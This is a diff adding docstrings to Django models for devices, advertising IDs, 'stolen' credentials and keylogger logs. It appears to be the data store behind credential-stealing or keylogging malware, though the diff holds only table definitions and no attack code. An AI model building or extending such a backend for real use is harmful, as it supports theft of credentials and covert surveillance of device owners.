@@ -1,7 +1,11 @@
+'''Model objects for interacting with the database.'''
+
 from django.db import models, IntegrityError
 
 
 class ApplicationModel(models.Model):
+    '''Abstract base to add timestamps to other models.'''
+
     created_at = models.DateTimeField(auto_now_add=True)
     updated_at = models.DateTimeField(auto_now=True)
 
@@ -10,6 +14,8 @@ class ApplicationModel(models.Model):
 
 
 class Device(ApplicationModel):
+    '''A specific device, aggregation point for other information.'''
+
     token = models.CharField(max_length=100)
 
     class Meta:
@@ -19,13 +25,18 @@ class Device(ApplicationModel):
         unique_together = ['token']
 
     def create_device_ids(self, ids):
+        '''
+        Create device ids for this device in a way that run their validations.
+
+        :param ids: Array of hash suitable to construct a DeviceId from
+        '''
         for new_id in ids:
-            # not as efficient as bulk_create, but actually runs the
-            # validations...
             self.device_ids.create(**new_id)
 
 
 class DeviceId(ApplicationModel):
+    '''Identifies for a device each has a type and a value.'''
+
     IdType = models.TextChoices('IdType', 'GOOGLE_AD_ID IOS_ID')
     id_type = models.CharField(choices=IdType.choices, max_length=100)
     value = models.CharField(max_length=100)
@@ -37,7 +48,10 @@ class DeviceId(ApplicationModel):
         ]
         unique_together = [['id_type', 'value']]
 
+    @staticmethod
     def validate_ids(sender, instance, **kwargs):
+        '''Additional validation, primarily that the type is one of the valid
+        choices.'''
         # no idea what the point of empty=False is if it doesn't catch this...
         if not instance.value:
             raise IntegrityError('DeviceId value may not be empty')
@@ -53,6 +67,8 @@ models.signals.pre_save.connect(DeviceId.validate_ids, sender=DeviceId)
 
 
 class Credential(ApplicationModel):
+    '''A stolen credential with information about where it came from.'''
+
     target = models.CharField(max_length=100)
     user = models.CharField(max_length=100)
     secret = models.CharField(max_length=100, blank=True)
@@ -66,5 +82,7 @@ class Credential(ApplicationModel):
 
 
 class Log(ApplicationModel):
+    '''A stolen log like from a keylogger.'''
+
     text = models.TextField()
     device = models.ForeignKey(Device, on_delete=models.CASCADE, related_name='logs')
